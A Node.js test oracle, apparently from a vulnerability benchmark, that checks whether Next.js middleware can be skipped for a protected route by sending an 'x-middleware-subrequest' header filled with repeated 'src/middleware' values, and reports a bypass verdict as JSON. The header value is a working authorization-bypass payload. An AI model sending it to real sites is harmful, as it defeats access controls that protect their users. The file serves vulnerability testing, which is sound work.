const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const markerDir = path.join(os.tmpdir(), 'next-authz-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2));
  fs.mkdirSync(markerDir, { recursive: true });

  let routeMatcher;
  try {
    ({ getMiddlewareRouteMatcher: routeMatcher } = require('next/dist/shared/lib/router/utils/middleware-route-matcher'));
  } catch (e) {
    evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
    emit();
    return;
  }

  if (typeof routeMatcher !== 'function') {
    evidence = 'missing_getMiddlewareRouteMatcher';
    emit();
    return;
  }

  let matcherFn;
  try {
    matcherFn = routeMatcher([
      {
        regexp: '^/protected(?:/.*)?$',
        originalSource: '/protected/:path*'
      }
    ]);
  } catch (e) {
    evidence = 'setup_failed:' + (e && e.message ? e.message : String(e));
    emit();
    return;
  }

  if (typeof matcherFn !== 'function') {
    evidence = 'matcher_not_function';
    emit();
    return;
  }

  let benignResult;
  try {
    benignResult = matcherFn('/protected/dashboard', {
      req: {
        headers: {}
      },
      nextConfig: {}
    });
  } catch (e) {
    evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
    emit();
    return;
  }

  if (benignResult !== true) {
    evidence = 'benign_failed:expected_true_got_' + String(benignResult);
    emit();
    return;
  }

  operation_completed = true;

  try {
    const attackResult = matcherFn('/protected/dashboard', {
      req: {
        headers: {
          'x-middleware-subrequest': 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
        }
      },
      nextConfig: {}
    });

    exploit_succeeded = attackResult === false;
    evidence = 'benign=' + String(benignResult) + '|attack=' + String(attackResult) + '|bypass=' + (exploit_succeeded ? 'yes' : 'no');
    fs.writeFileSync(path.join(markerDir, 'evidence.txt'), evidence);
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
  }

  emit();
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
  emit();
}